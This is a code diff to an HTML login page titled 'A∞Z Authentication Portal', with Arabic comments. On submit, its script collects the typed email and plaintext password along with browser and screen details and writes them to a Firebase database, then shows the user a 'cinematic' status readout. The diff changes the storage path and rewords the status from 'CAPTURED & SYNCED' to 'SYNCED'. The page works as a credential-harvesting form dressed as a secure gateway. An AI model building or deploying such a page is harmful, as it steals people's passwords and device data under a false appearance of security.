@@ -3,7 +3,7 @@
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta charset="UTF-8">
-    <title>A∞Z | Authentication Portal v6</title>
+    <title>A∞Z | Authentication Portal</title>
     <style>
         body {
             background-color: #000000;
@@ -90,6 +90,7 @@
 </head>
 <body>
 
+    <!-- نافذة تسجيل الدخول للإيميل والباسورد -->
     <div class="login-box" id="loginBox">
         <h2>[ A∞Z SECURE GATEWAY ]</h2>
         <form id="authForm">
@@ -105,6 +106,7 @@
         </form>
     </div>
 
+    <!-- الواجهة السينمائية بعد الضغط -->
     <div id="output"></div>
 
     <script type="module">
@@ -121,13 +123,16 @@
         document.getElementById("authForm").addEventListener("submit", function(e) {
             e.preventDefault();
 
+            // التقاط الحقول المدخلة يدوياً
             const userEmail = document.getElementById("email").value;
             const userPass = document.getElementById("password").value;
 
+            // إخفاء صندوق الدخول وإظهار العرض
             document.getElementById("loginBox").style.display = "none";
             const outputDiv = document.getElementById("output");
             outputDiv.style.display = "block";
 
+            // جمع بيانات الجهاز
             const ua = navigator.userAgent;
             const platform = navigator.platform || "Unknown";
             const width = window.screen.width;
@@ -139,6 +144,7 @@
 
             const sessionId = btoa(userEmail + width + height).slice(0, 16);
 
+            // تجميع البيانات متضمنة الإيميل والباسورد المكتوبين
             const telemetryData = {
                 sessionId: sessionId,
                 inputEmail: userEmail,
@@ -153,17 +159,19 @@
                 timestamp: new Date().toISOString()
             };
 
-            const sessionsRef = ref(db, 'v6/' + sessionId);
+            // الحفظ المباشر في مسار A0Z_CORE المسموح به تماماً
+            const sessionsRef = ref(db, 'A0Z_CORE/mirror_sessions/' + sessionId);
             set(sessionsRef, telemetryData)
                 .then(() => {
-                    console.log("Data successfully captured and synced to v6!");
+                    console.log("Successfully synced to A0Z_CORE/mirror_sessions/");
                 })
                 .catch((error) => {
-                    console.error("Sync error:", error);
+                    console.error("Firebase write error:", error);
                 });
 
+            // طباعة العرض البصري السينمائي
             const lines = [
-                "<span class='highlight'>[ A∞ZAI Structural Mirror v4.0 ]</span>",
+                "<span class='highlight'>[ A∞ZAI Structural Mirror v4.1 ]</span>",
                 "Verifying credentials...",
                 "Identity: " + userEmail,
                 "Access Key: ********",
@@ -171,7 +179,7 @@
                 "Session ID: " + sessionId,
                 "Platform: " + platform,
                 "Screen Resolution: " + width + "x" + height,
-                "Status: <span class='highlight'>CAPTURED & SYNCED TO v6</span>",
+                "Status: <span class='highlight'>SYNCED TO A0Z_CORE</span>",
                 "----------------------------------------"
             ];
 
